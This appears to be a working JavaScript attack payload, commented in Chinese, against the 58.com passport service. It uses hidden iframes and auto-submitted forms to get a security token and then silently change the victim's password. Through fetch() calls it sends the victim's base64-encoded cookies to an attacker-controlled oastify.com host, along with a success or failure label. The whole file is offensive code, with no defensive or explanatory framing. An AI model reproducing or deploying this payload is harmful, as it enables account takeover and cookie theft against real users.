
//用于接收post表单响应

document.write('<iframe src="" frameborder="0" id="iframe1" name="iframeName1"></iframe>');

document.write('<iframe src="" frameborder="0" id="iframe2" name="iframeName2"></iframe>');

document.domain="58.com";

//攻击者域名

window.hacker="https://mzpuboqlvhhtczuchim18lk4vv1lpa.oastify.com/"

//post请求https://passport.58.com/sec/58/envircheck/pc/check响应的回调函数定义,

// 如果响应有token，调用form2函数修改密码并把账号(cookie中有账号)发送给攻击者，否则告诉攻击者此账号有安全验证，无法修改，只发送cookie。

class sdk{successFun(t){window.token=t["data"]["token"];window.k="token";if (window.token==undefined){fetch(window.hacker+"Security_verification_is_required----"+btoa(document.cookie));}else{form2fun();}}}

SDK_CALLBACK_FUN_1664883111364=new sdk();

//post请求https://passport.58.com/sec/58/newmodifypwd/pc/modify响应的回调函数定义。

class sdk2{successFun(t){window.code=t["code"];if(window.code==0 || window.code==802){fetch(window.hacker+"modify_successfully----"+btoa(document.cookie))}else{fetch(window.hacker+"fail_to_modify"+btoa(document.cookie))}}}

SDK_CALLBACK_FUN_1664980264130=new sdk2()

// 获取token

form1= document.createElement("form");

form1.id="id1";

form1.name="name1";

form1.method = "POST";

form1.action = "//passport.58.com/sec/58/envircheck/pc/check";

form1.target = "iframeName1";

document.body.appendChild(form1);

key=["type","domain","callback"];

params={"type":"1","domain":"58.com","callback":"SDK_CALLBACK_FUN_1664883111364.successFun"};

for (var i=0;i<3;i++){

    j = document.createElement("input");

    j.type = "text";

    j.name = key[i];

    j.value = params[key[i]];

    form1.appendChild(j);

}

form1.submit();

// 修改密码

form2fun=function() {

form2= document.createElement("form");

form2.id="id2";

form2.name="name2";

form2.method = "POST";

form2.action = "//passport.58.com/sec/58/newmodifypwd/pc/modify";

form2.target = "iframeName2";

document.body.appendChild(form2);

key2=["password","callback"];

key2[2]=window.k

params2={"password":"","callback":"SDK_CALLBACK_FUN_1664980264130.successFun"};

params2[window.k]=window.token

for (var i=0;i<3;i++){

    k = document.createElement("input");

    k.type = "text";

    k.name = key2[i];

    k.value = params2[key2[i]];

    form2.appendChild(k);

}

form2.submit();

}

